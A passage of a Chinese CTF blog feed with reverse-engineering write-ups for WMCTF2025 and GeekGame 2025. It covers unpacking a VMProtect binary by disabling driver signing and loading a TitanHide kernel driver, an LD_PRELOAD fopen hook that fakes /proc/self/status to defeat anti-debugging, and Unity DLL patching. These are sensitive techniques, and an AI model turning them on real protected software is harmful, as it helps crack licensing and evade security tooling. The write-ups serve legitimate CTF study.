class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMCTF&#123;I_R4@11y_w@n7_70 _84c0m4_@_m@gic@1_Gir1&#125;</span><br></pre></td></tr></table></figure><h2 id="Videoplayer-复现"><a href="#Videoplayer-复现" class="headerlink" title="Videoplayer [复现]"></a>Videoplayer [复现]</h2><p><a href="https://tkazer.github.io/2025/09/20/WMCTF2025-DevNote/">WMCTF2025 VideoPlayer 逆向出题笔记 | Liv’s blog</a></p><p>有壳VMP</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250924225205009.png" alt="image-20250924225205009"></p><blockquote><p>首先我们需要VMProtect。VMProtect是一款虚拟机保护软件，是目前最为流行的保护壳之一。VMProtect将保护后的代码放到虚拟机中运行，这将使分析反编译后的代码和破解变得极为困难。除了代码保护，VMProtect还可以生成和验证序列号，设置过期时间，限制免费更新等等。这样即使攻击者用反汇编工具看到指令，也只是虚拟机的字节码，而不是真实的 x86&#x2F;AMD64 指令，大大增加了逆向难度。<strong>虚拟机保护通常会和大量反调试 &#x2F; 反分析 &#x2F; 完整性检查一起使用</strong>，以进一步提升逆向难度。</p></blockquote><p>脱壳需要寻找oep，程序入口点</p><p><strong>VMProtect + 其他反调试</strong> 会在用户态用很多 API&#x2F;机制检测调试器（如 <code>IsDebuggerPresent</code>、异常行为、时间差、调试寄存器、调试句柄等），这些检测很难单靠用户态插件完全隐蔽。</p><p>用了sharpod和Scyllahide均无法过</p><p>出题人给了两种解法</p><p><strong>法1：TitanHide过反调试</strong></p><p>这边反调试使用TitanHide驱动，Github可以搜索到相关项目，运行TitanHide.sys需要配置环境。</p><p><a href="https://github.com/mrexodia/TitanHide">mrexodia&#x2F;TitanHide: Hiding kernel-driver for x86&#x2F;x64.</a></p><p><a href="https://mp.weixin.qq.com/s/NN-CtnOudpZx4JbxHJlXJA">微信公众平台</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set testsigning on</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250925081824950.png" alt="image-20250925081824950"></p><p>如果无法设置需要进入bios去关闭相应的安全模式，电脑不同方法不同</p><p>命令成功后需要重启，左&#x2F;右下交出现test成功了</p><p>关闭就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set testsigning off</span><br></pre></td></tr></table></figure><p>使用VKD工具的target64中的vminstall在虚拟机中运行安装，会多出来一个引导启动，重启电脑选择新的引导启动就可以，他会进入内核调试模式，禁止驱动强制签名以及关闭PG，也就可以让我们加载titanhide驱动。</p><p>运行titanhide.sys，将titanhide的dbg相关插件文件放入dbg的plugins文件夹中，运行dbg即可调试VMP程序。</p><p><strong>法2：CheatEngine Veh debugger</strong></p><p>软件运行后，使用CE附加，选用VEH Debugger即可进行断点调试。</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250925084449156.png" alt="image-20250925084449156"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251009083541751.png" alt="image-20251009083541751"></p><p>这能调出来我觉得也是神人了T.T</p><p>还是得脱壳，调试可以用CE</p><p><strong>VMP脱壳</strong></p><p>TitanHide环境配置</p><p>先搞个win10 64虚拟机，开启测试模式后</p><p>把TitanHide.sys放在(root)&#x2F;system32&#x2F;drive&#x2F;下</p><p>注意使用管理员权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set testsigning on</span><br><span class="line">sc.exe create TitanHide binPath= &quot;C:\Windows\System32\drivers\TitanHide.sys&quot; type= kernel</span><br><span class="line">sc.exe start TitanHide</span><br><span class="line">sc.exe query TitanHide</span><br></pre></td></tr></table></figure><p>然后把GUI打开</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251009133625595.png" alt="image-20251009133625595"></p><p>更详细步骤可以看：<a href="https://www.ctfiot.com/272572.html">https://www.ctfiot.com/272572.html</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251009133803723.png" alt="image-20251009133803723"></p><p>下断点</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251009135850764.png" alt="image-20251009135850764"></p><p>还是卡住了，看了下wp忽略了一条消息</p><blockquote><p>使用VKD工具的target64中的vminstall在虚拟机中运行安装，会多出来一个引导启动，重启电脑选择新的引导启动就可以，他会进入内核调试模式，禁止驱动强制签名以及关闭PG，也就可以让我们加载titanhide驱动。</p></blockquote><p><strong>VKD</strong> 是 <strong>VirtualKD</strong>（一个用来加速&#x2F;简化在虚拟机上做 Windows 内核调试的工具链）；</p><p><strong>target64</strong> 是 VirtualKD 发布包里针对 64-bit 客机的那一组文件夹（包含 <code>vminstall.exe</code>、驱动和调试传输 dll 等）；</p><p><code>vminstall.exe</code> 是放在 <code>target64</code> 里、在虚拟机内运行的安装&#x2F;引导助手 —— 它会在客机上安装需要的组件并添加一个新的启动项（boot entry）以便用内核调试模式启动虚拟机，从而能更方便地进行 KD（kernel debugging）。这些信息都可以在 VirtualKD 的官方文档&#x2F;教程里找到。</p><p>注意使用TitanHide需要删掉其它用户态的反调试插件如ScyllaHide等，多亏了Liv师傅，不然得搞半天</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251019221257149.png" alt="image-20251019221257149"></p><p>可以先转到然后搜索GetSystemTimeAsFileTime</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251019221352976.png" alt="image-20251019221352976"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251019221405866.png" alt="image-20251019221405866"></p><p>下断点</p><p>运行到EntryPoint后</p><p>第二次运行到断点后</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251019222500328.png" alt="image-20251019222500328"></p><p>下硬件断点</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251019222618735.png" alt="image-20251019222618735"></p><p>Scylla导出dump</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251019222645655.png" alt="image-20251019222645655"></p><p>分析</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251019232252247.png" alt="image-20251019232252247"></p><blockquote><p>题目说存在后门账户，猜测会通过strcmp判断用户名或密码文本（这边通过断点用户名或密码的内存进行后续分析也可以）</p></blockquote><p>随便输入用户名和密码后，断点strcmp，点击Login按钮断下，发现会判断一次用户名是否为<code>WMAdmin_#6&amp;JZZ%B</code>，证实确实存在后门用户名判断，但是目前还是登入失败。</p><p>做到这目前是我的极限了……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WMCTF-2025-re-wp&quot;&gt;&lt;a href=&quot;#WMCTF-2025-re-wp&quot; class=&quot;headerlink&quot; title=&quot;WMCTF 2025 re wp&quot;&gt;&lt;/a&gt;WMCTF 2025 re wp&lt;/h1&gt;&lt;h2 id=&quot;catfriend</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>一道题浅析LD_PRELOAD文件劫持 /proc/self/status反反调试</title>
    <link href="http://matriy330.github.io/b6dfbc54/"/>
    <id>http://matriy330.github.io/b6dfbc54/</id>
    <published>2025-10-26T11:32:14.000Z</published>
    <updated>2025-10-30T12:56:25.484Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一道题浅析LD-PRELOAD文件劫持-proc-self-status反反调试"><a href="#一道题浅析LD-PRELOAD文件劫持-proc-self-status反反调试" class="headerlink" title="一道题浅析LD_PRELOAD文件劫持 &#x2F;proc&#x2F;self&#x2F;status反反调试"></a>一道题浅析LD_PRELOAD文件劫持 &#x2F;proc&#x2F;self&#x2F;status反反调试</h1><p>这是Geekgame2025的一道逆向题，需要附件联系我</p><p>其中里面有打开&#x2F;proc&#x2F;self&#x2F;status的反调试，对于这题来说很简单，我们修改stack或者patch直接让v1为0均可</p><p>但是为了学习，可以了解下LD_PRELOAD文件劫持实现反反调试</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251025111805942.png" alt="image-20251025111805942"></p><p>可以看下调试时的pid</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251024212657134.png" alt="image-20251024212657134"></p><p>对于本题很简单，ai直接给出脚本即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hide_tracer.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> FILE *(*<span class="type">fopen_t</span>)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">fopen_t</span> real_fopen = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成一个假的 /proc/self/status 内容，其中保证包含 TracerPid: 0 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> fake_status[] =</span><br><span class="line"><span class="string">&quot;Name:\tmyproc\n&quot;</span></span><br><span class="line"><span class="string">&quot;State:\tR (running)\n&quot;</span></span><br><span class="line"><span class="string">&quot;Pid:\t1234\n&quot;</span></span><br><span class="line"><span class="string">&quot;PPid:\t1\n&quot;</span></span><br><span class="line"><span class="string">&quot;TracerPid:\t0\n&quot;</span>   <span class="comment">/* &lt;-- 关键：返回 0 表示未被调试 */</span></span><br><span class="line"><span class="string">&quot;Uid:\t1000\t1000\t1000\t1000\n&quot;</span></span><br><span class="line"><span class="string">&quot;VmSize:\t0 kB\n&quot;</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 替换 fopen，只在 path == &quot;/proc/self/status&quot; 时返回内存 FILE* */</span></span><br><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *mode)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!real_fopen) &#123;</span><br><span class="line">        real_fopen = (<span class="type">fopen_t</span>)dlsym(RTLD_NEXT, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path &amp;&amp; <span class="built_in">strcmp</span>(path, <span class="string">&quot;/proc/self/status&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* fmemopen 在 glibc 可用：把字符串当作 FILE* 返回 */</span></span><br><span class="line">        <span class="comment">/* 注意：fmemopen 需要可写缓冲区，因此复制一份到 malloc 的区域 */</span></span><br><span class="line">        <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fake_status));</span><br><span class="line">        <span class="keyword">if</span> (!buf) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, fake_status, <span class="keyword">sizeof</span>(fake_status));</span><br><span class="line">        <span class="keyword">return</span> fmemopen(buf, <span class="keyword">sizeof</span>(fake_status) - <span class="number">1</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 其他文件按真实 fopen 处理 */</span></span><br><span class="line">    <span class="keyword">return</span> real_fopen(path, mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要用IDA进行远程调试这里有个坑点就是</p><p>远程调试需要用这个命令去设置环境变量启动调试器，在Parameters里设置没有用!!!：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o hide_tracer.so hide_tracer.c -ldl</span><br><span class="line">LD_PRELOAD=/home/matriy/RE/TSCTF/hide_tracer.so ./linux_server64</span><br></pre></td></tr></table></figure><p>此外写出代码很简单，我们也需要了解背后机理：</p><p>当设置了 <code>LD_PRELOAD=/path/to/hook.so</code> 时，Linux 动态链接器在加载程序时会<strong>优先加载这个库，并把里面的同名函数符号放在最前面</strong>。</p><p>所以当程序调用 <code>fopen()</code> 时，**动态链接器解析符号时先找到库里的 <code>fopen</code>**，就直接调用你写的函数，而不是 libc 的版本。</p><p>符号解析顺序（优先级）大致如下：</p><ol><li><strong>主程序（main ELF）</strong></li><li><strong><code>LD_PRELOAD</code> 指定的库（最高优先）</strong> </li><li><strong>其他依赖库（按照 ELF 的依赖顺序）</strong></li><li><strong>libc.so.6（系统 C 标准库）</strong></li><li><strong>ld-linux 自身</strong></li></ol><p>在我们的代码中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!real_fopen) &#123;</span><br><span class="line">    real_fopen = (<span class="type">fopen_t</span>)<span class="built_in">dlsym</span>(RTLD_NEXT, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这行的作用是说：</p><blockquote><p>找下一个名为 <code>fopen</code> 的实现（也就是 libc 里的真正 fopen）</p></blockquote><p><code>RTLD_NEXT</code> 代表：</p><blockquote><p>从当前库之后继续查找同名符号。</p></blockquote><p>于是就能在 hook 函数里调用原版函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return real_fopen(path, mode);</span><br></pre></td></tr></table></figure><p>也就是说调试时会先找到我的fopen，调用我的这个函数，然后我去找真实的函数，并判断调用这个函数的path是否是&#x2F;proc&#x2F;self&#x2F;status</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一道题浅析LD-PRELOAD文件劫持-proc-self-status反反调试&quot;&gt;&lt;a href=&quot;#一道题浅析LD-PRELOAD文件劫持-proc-self-status反反调试&quot; class=&quot;headerlink&quot; title=&quot;一道题浅析LD_PREL</summary>
      
    
    
    
    <category term="Re" scheme="http://matriy330.github.io/categories/Re/"/>
    
    
    <category term="Re" scheme="http://matriy330.github.io/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>GeekGame 2025 re wp</title>
    <link href="http://matriy330.github.io/fab00bb3/"/>
    <id>http://matriy330.github.io/fab00bb3/</id>
    <published>2025-10-25T10:22:34.000Z</published>
    <updated>2025-10-30T12:55:42.003Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GeekGame-2025-re-wp"><a href="#GeekGame-2025-re-wp" class="headerlink" title="GeekGame 2025 re wp"></a>GeekGame 2025 re wp</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020200147600.png" alt="image-20251020200147600"></p><p>在线网站把所有帧提出来，第一个帧是背景可以写个妙妙小脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageChops</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件名</span></span><br><span class="line">background_path = <span class="string">&quot;1.png&quot;</span></span><br><span class="line">layers = [<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.png&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取背景图</span></span><br><span class="line">background = Image.<span class="built_in">open</span>(background_path).convert(<span class="string">&quot;L&quot;</span>)  <span class="comment"># 转灰度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化一个全白背景</span></span><br><span class="line">result = Image.new(<span class="string">&quot;L&quot;</span>, background.size, <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理每一层</span></span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> layers:</span><br><span class="line">    img = Image.<span class="built_in">open</span>(path).convert(<span class="string">&quot;L&quot;</span>)</span><br><span class="line">    <span class="comment"># 与背景做差</span></span><br><span class="line">    diff = ImageChops.difference(img, background)</span><br><span class="line">    diff_np = np.array(diff)</span><br><span class="line">    <span class="comment"># 阈值分割：差异大的设为黑（0），其余设为白（255）</span></span><br><span class="line">    mask = np.where(diff_np &gt; <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>).astype(np.uint8)</span><br><span class="line">    <span class="comment"># 与结果图按位与（取黑色部分）</span></span><br><span class="line">    result_np = np.minimum(np.array(result), mask)</span><br><span class="line">    result = Image.fromarray(result_np)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存结果</span></span><br><span class="line">result.save(<span class="string">&quot;decoded.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;✅ 已生成 decoded.png (白底黑码)&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020215237690.png" alt="image-20251020215237690"></p><p>然后在线网站DataMatrix提取flag</p><p>flag{see!!the-wind-of-miss-yooou-around-finally-blowwws-to-geek-game~~~}</p><p>二阶段提示：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251024172251071.png" alt="image-20251024172251071"></p><p>测了下ChatGPT白色背景没识别，可能要透明</p><p>夸克可以扫出来</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="人机大战"><a href="#人机大战" class="headerlink" title="人机大战"></a>人机大战</h3><h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020204639945.png" alt="image-20251020204639945"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dont-laugh-you-try-you-also-cant-beat-the-second-level&#125;</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="团结引擎"><a href="#团结引擎" class="headerlink" title="团结引擎"></a>团结引擎</h3><p>flag13可以通过patch dll来，encodeText种有个揭秘字符串的操作，直接patch右键添加这一个日志操作，打印出来，编译然后左上角生成dll</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251018150745803.png" alt="image-20251018150745803"></p><p>替换原先的，运行dll就行了</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251018150840562.png" alt="image-20251018150840562"></p><ul><li>flag{gam4_ed2tor_pro}</li><li>flag{T2me_M0GIC5him}</li></ul><p>猜测也能通过飞天来找这两个flag</p><p>还有个没找到估计在墙里</p><p>flag1可以修改Unity.StarterAssets的ThirdPersonController</p><blockquote><p>当然更简单的做法是直接让门升起来，我这么做只是好玩.</p><p>如door可以直接加start方法</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Door2</span></span><br><span class="line"><span class="comment">// Token: 0x06000162 RID: 354</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>._openingTriggered = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.countdownText)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.countdownText.text = <span class="string">&quot;Opening&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>._mountedObject)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>._mountedObject.localPosition = <span class="keyword">this</span>._mountedTargetPos;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>patch成飞天</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.InputSystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">StarterAssets</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">RequireComponent(typeof(CharacterController))</span>]</span><br><span class="line">    [<span class="meta">RequireComponent(typeof(PlayerInput))</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span 